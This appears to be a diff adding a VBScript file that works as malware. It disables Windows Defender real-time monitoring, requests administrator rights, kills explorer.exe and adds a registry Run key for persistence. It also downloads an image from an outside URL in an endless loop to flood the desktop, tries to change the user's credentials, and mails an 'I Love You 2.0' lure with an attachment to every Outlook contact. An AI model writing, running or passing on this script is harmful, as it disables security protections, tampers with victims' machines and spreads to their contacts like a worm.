@@ -1,0 +1,111 @@
+' Purpose : Disable Real-Time Monitoring ( 1 )
+Sub DisableRealTimeMonitoring()
+    Dim shell
+    Set shell = CreateObject("WScript.Shell")
+    shell.Run "powershell -Command ""Set-MpPreference -DisableRealTimeMonitoring $true""", 0, True
+    Set shell = Nothing
+End Sub
+
+' Purpose: Admin Request ( 2 )
+Sub RunAdminRequest()
+    Dim shell
+    Set shell = CreateObject("WScript.Shell")
+    shell.Run "powershell -Command ""Start-Process powershell -Verb RunAs""", 0, True
+    Set shell = Nothing
+End Sub
+
+' Purpose: Task Kill ( 3 )
+Sub TaskKill()
+    Dim shell
+    Set shell = CreateObject("WScript.Shell")
+    shell.Run "taskkill /f /im explorer.exe", 0, True
+    Set shell = Nothing
+End Sub
+
+' Purpose : Auto run ( 4 )
+Sub AutoRun()
+    Dim shell
+    Set shell = CreateObject("WScript.Shell")
+    Dim filePath
+    filePath = "C:\Users\" & CreateObject("WScript.Network").Username & "\Desktop\YourFile.exe"
+    shell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\YourFileName", filePath, "REG_SZ"
+    Set shell = Nothing
+End Sub
+
+' Purpose : File Multiply ( 5 )
+Sub DownloadImage()
+    Dim shell
+    Set shell = CreateObject("WScript.Shell")
+    Dim imgURL
+    imgURL = "https://image.cdn2.seaart.me/2025-02-18/cuq25vde878c73dgan9g-2/2f66e4423ca25dhd448c835abb3b48b043_high.webp"
+    Dim filePath
+    filePath = "C:\Users\" & CreateObject("WScript.Network").Username & "\Desktop\RUNRUNRUN\"
+    Dim x, y
+    x = 0
+    y = 0
+    Dim fileCount
+    fileCount = 1
+    While True
+        Dim objXMLHTTP
+        Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+        objXMLHTTP.Open "GET", imgURL, False
+        objXMLHTTP.Send
+        Dim objADOStream
+        Set objADOStream = CreateObject("ADODB.Stream")
+        objADOStream.Open
+        objADOStream.Type = 1
+        objADOStream.Write objXMLHTTP.ResponseBody
+        objADOStream.SaveToFile filePath & fileCount & ".webp", 2
+        x = x + 100
+        If x > 1920 Then
+            x = 0
+            y = y + 100
+        End If
+        fileCount = fileCount + 1
+        WScript.Sleep 1000
+    Wend
+    Set shell = Nothing
+End Sub
+
+' Purpose : Change Username ( 6 )
+Sub ChangeUsername()
+    Dim objUser, strUsername, strPassword
+    strUsername = "RUN"
+    strPassword = "3692"
+    Set objUser = CreateObject("WScript.Network")
+    objUser.SetUsername strUsername, strPassword
+End Sub
+
+' Purpose : Send Email ( 7 )
+Sub SendEmail()
+    Dim olApp
+    Set olApp = CreateObject("Outlook.Application")
+    Dim olNamespace
+    Set olNamespace = olApp.GetNamespace("MAPI")
+    Dim olAddressList
+    Set olAddressList = olNamespace.AddressLists(1)
+    Dim olAddressEntry
+    For Each olAddressEntry In olAddressList.AddressEntries
+        Dim olMail
+        Set olMail = olApp.CreateItem(0)
+        olMail.Recipients.Add olAddressEntry
+        olMail.Subject = "I Love You 2.0"
+        olMail.Body = "Kindly check the love letter for you."
+        Dim olAttachment
+        Set olAttachment = olMail.Attachments.Add("C:\Path\To\Attachment.txt")
+        olMail.Send
+    Next
+    Set olAddressEntry = Nothing
+    Set olAddressList = Nothing
+    Set olNamespace = Nothing
+    Set olApp = Nothing
+End Sub
+
+' Run the scripts
+Call DisableRealTimeMonitoring
+Call RunAdminRequest
+Call TaskKill
+Call AutoRun
+Call DownloadImage
+Call ChangeUsername
+Call SendEmail
